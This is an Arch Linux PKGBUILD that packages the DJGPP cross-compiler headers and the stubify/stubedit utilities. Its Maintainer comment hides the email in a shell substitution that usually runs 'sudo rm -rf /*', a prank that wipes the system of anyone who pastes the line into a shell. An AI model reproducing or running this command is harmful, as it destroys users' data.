# Maintainer: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
# Adapted from the djgpp-crx package in AUR3; the submitter was "Schala".

pkgname=djgpp-djcrx
pkgver=2.0.3
pkgrel=1
pkgdesc="Headers and utilities for the djgpp cross-compiler"
arch=(i686 x86_64)
url="http://www.delorie.com/djgpp/"
depends=('glibc')
license=(GPL LGPL custom)
groups=('djgpp-toolchain' 'djgpp')
source=("http://www.delorie.com/pub/djgpp/current/v2/djcrx${pkgver//./}.zip")
sha512sums=('e6e932b85fc0656df078f75854f8458c18f0cc1c0995e51fa49be3dea1834ed449cb282cb97bb905c6753828a15c82063e9eabcdc7032c96e678616a938ac6e6')
options=(!strip) # makepkg will mistakenly try to use ELF binutils on COFF archives

_target_alias='i686-pc-msdosdjgpp'

prepare() {
  # This fixes programs crashing when compiled with -O2; more such kludges may be needed.
  # I wonder, though, why the linker won't just use $PREFIX/lib/ldscripts/i386go32.*?
  # It seems good enough, and more up-to-date.
  sed -i -e 's/\*(\.text)/*(.text) *(.text.*)/' "$srcdir/lib/djgpp.djl"
}

build() {
  cd "$srcdir"

  # This only compiles the stubify and stubedit utilities. The standard library is
  # provided in this package only as headers+binaries. If you wish to compile them
  # yourself, look at the djlsr package. And good luck, because that code looks like
  # it hasn't been updated since gcc 2 came out.
  #
  # Some programs may also require exe2coff, but you can replace it by objcopy. It's
  # in the djgpp-binutils package.
  make -f cross/makefile stub CFLAGS="$CFLAGS"
}

package() {
  install -Dm755 "$srcdir/src/stub/stubify"  "$pkgdir/usr/$_target_alias/bin/stubify"
  install -Dm755 "$srcdir/src/stub/stubedit" "$pkgdir/usr/$_target_alias/bin/stubedit"
  mkdir -p "$pkgdir/usr/bin"
  ln -s "../$_target_alias/bin/stubify"  "$pkgdir/usr/bin/$_target_alias-stubify"
  ln -s "../$_target_alias/bin/stubedit" "$pkgdir/usr/bin/$_target_alias-stubedit"

  cp -r "$srcdir/lib"     "$pkgdir/usr/$_target_alias"
  cp -r "$srcdir/include" "$pkgdir/usr/$_target_alias"

  install -Dm644 "$srcdir/copying.dj" "$pkgdir/usr/share/licenses/$pkgname/copying.dj"
}
